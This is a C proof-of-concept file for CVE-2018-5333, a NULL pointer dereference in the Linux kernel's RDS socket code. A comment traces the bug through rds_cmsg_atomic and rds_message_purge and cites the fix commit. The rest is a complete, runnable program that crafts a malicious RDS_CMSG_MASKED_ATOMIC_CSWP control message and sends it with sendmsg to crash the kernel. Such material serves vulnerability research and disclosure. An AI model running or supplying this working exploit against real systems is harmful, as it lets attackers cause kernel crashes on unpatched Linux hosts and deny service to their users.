// https://github.com/TamiiLambrado/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c
/* simo: RDS sock : memory corruption in rds_atomic_free_op()
   Fixed here :
   http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=7d11f77f84b27cef452cee332f4e469503084737
   https://github.com/torvalds/linux/commit/7d11f77f84b27cef452cee332f4e469503084737
  
   Here is an analysis of a memory corruption and info leak  in RDS socket family, 

  The vulnerability affects Linux Kernel from v2.6.36-rc1 to the latest version, 
  it's been introduced in this commit 15133f6e67d8d646d0744336b4daa3135452cb0d

  The vulnerability occurs when we deal with ancullary data aka control message buffer in msghdr structure,  

  static int rds_cmsg_send(struct rds_sock *rs, struct rds_message *rm,
  struct msghdr *msg, int *allocated_mr)
  {
  ...
	case RDS_CMSG_ATOMIC_CSWP:
	case RDS_CMSG_ATOMIC_FADD:
	case RDS_CMSG_MASKED_ATOMIC_CSWP:
	case RDS_CMSG_MASKED_ATOMIC_FADD:
		ret = rds_cmsg_atomic(rs, rm, cmsg); 		<---- (1)
		break;
  ...
  }

  (1) - By using cmsg_tye = RDS_CMSG_MASKED_ATOMIC_CSWP, we reach rds_cmsg_atomic() 

  int rds_cmsg_atomic(struct rds_sock *rs, struct rds_message *rm,
  struct cmsghdr *cmsg)
  {
  ...

	rm->atomic.op_notify = !!(args->flags & RDS_RDMA_NOTIFY_ME);
	rm->atomic.op_silent = !!(args->flags & RDS_RDMA_SILENT);
	rm->atomic.op_active = 1;						<------(2.1)
	rm->atomic.op_recverr = rs->rs_recverr;
	rm->atomic.op_sg = rds_message_alloc_sgs(rm, 1);	<----- (2.2)
	if (!rm->atomic.op_sg) {
		ret = -ENOMEM;
	goto err;
  }

  /* verify 8 byte-aligned *
  if (args->local_addr & 0x7) {						<----- (3)
	ret = -EFAULT;
	goto err;
  }

  ret = rds_pin_pages(args->local_addr, 1, &page, 1);	<----- (4)
  if (ret != 1)
	  goto err;
  ...
  err:
  if (page)
	put_page(page);
  kfree(rm->atomic.op_notifier);					<---- (5)

  return ret;
  }


  static void rds_message_purge(struct rds_message *rm)
  {
  ...

	if (rm->atomic.op_active)
	rds_atomic_free_op(&rm->atomic);			<---- (6)
  ... 
  }

  (2.1) - put 1 to op_active
  (2.2) - by calling rds_senmsg() , it manages to allocate rds_message structure + and extra length used for DMA by using scatterlists, rds_message_alloc_sgs() tries to make the scatterlist right after the rds_message
  (3) 	- args is a user controllable buffer ,args->local_addr expects to have a valid user address 
  (4) 	- rds_pin_pages tries to get  user page by calling get_user_pages_fast(), the former function fails if we provide an invalid user pointer and return -EFAULT 
  (5) 	- rds_pin_pages() fails and goes to err , it frees rm->atomic.op_notifier and forgets to put rm->atomic.op_active to 0
  (6)   - op_active has 1 even the scatterlist page pointer is NULL , this leads to a NULL pointer dereference
	
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/rds.h>
#include <netinet/in.h>
#include <unistd.h>

#define RAND_SIZE 4096
int main(void)
{
	struct sockaddr_in sin;
	struct msghdr msg;
	char buf[RAND_SIZE];
	struct cmsghdr cmsg;

	memset(&sin,0,sizeof(struct sockaddr));
	memset(&msg,0,sizeof(msg));
	memset(buf,0x40,sizeof(buf));
	memset(&cmsg,0,sizeof(cmsg));

	int fd = socket(0x15,5,0);
	if(fd < 0) {
		perror("socket");
		return -1;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(2000);
	sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	bind(fd,(struct sockaddr*)&sin,sizeof(sin));

	cmsg.cmsg_len = RAND_SIZE;
	cmsg.cmsg_type = RDS_CMSG_MASKED_ATOMIC_CSWP;
	cmsg.cmsg_level = SOL_RDS;

	memcpy(&buf[0],&cmsg,sizeof(cmsg));

	*(uint64_t *)(buf + 0x18) = 0x40404000; /* args->local_addr */

	msg.msg_name = &sin;
	msg.msg_namelen = sizeof(sin);
	msg.msg_iov = NULL;
	msg.msg_iovlen = 0;
	msg.msg_control = buf;
	msg.msg_controllen = RAND_SIZE;
	msg.msg_flags = MSG_DONTROUTE|MSG_PROXY|MSG_WAITALL;

	sendmsg(fd,&msg,0);
	return 0;
}
